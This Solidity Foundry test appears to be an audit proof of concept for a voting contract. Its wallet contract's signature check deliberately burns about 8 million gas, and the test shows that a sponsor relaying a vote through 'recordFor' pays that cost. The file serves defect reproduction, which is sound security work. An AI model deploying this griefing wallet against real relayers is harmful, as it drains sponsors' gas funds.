// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

// Copy into vote/test/ to run; uses the audited contract and existing fixtures.
import {Fixture} from "./helpers/Fixtures.sol";
import {console} from "forge-std/Test.sol";
import {IERC1271} from "@openzeppelin/contracts/interfaces/IERC1271.sol";
import {IERC721Receiver} from "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

contract ExpensiveSignatureWallet is IERC1271, IERC721Receiver {
    function isValidSignature(bytes32, bytes calldata) external view returns (bytes4) {
        uint256 before = gasleft();
        while (before - gasleft() < 8_000_000) {}
        return IERC1271.isValidSignature.selector;
    }

    function onERC721Received(address, address, uint256, bytes calldata) external pure returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }
}

contract RelayerGasReproduction is Fixture {
    // Defect probe: this passes when owner-supplied signature code consumes the sponsor's gas.
    function test_expensiveOwnerSignatureStillRecordsBallot() public {
        ExpensiveSignatureWallet owner = new ExpensiveSignatureWallet();
        vm.prank(alice);
        ballots.safeTransferFrom(alice, address(owner), 1);
        vm.warp(start);
        uint8[] memory proof = proofOf(ranks);
        uint256 before = gasleft();
        ballots.recordFor(1, 1, ranks, hex"1234", proof);
        uint256 used = before - gasleft();
        assertGt(used, 8_000_000);
        assertEq(ballots.nonceOf(1), 1);
        assertEq(ballots.ballotHashOf(1), keccak256(ranks));
        console.log("Successful recordFor gas used", used);
    }
}
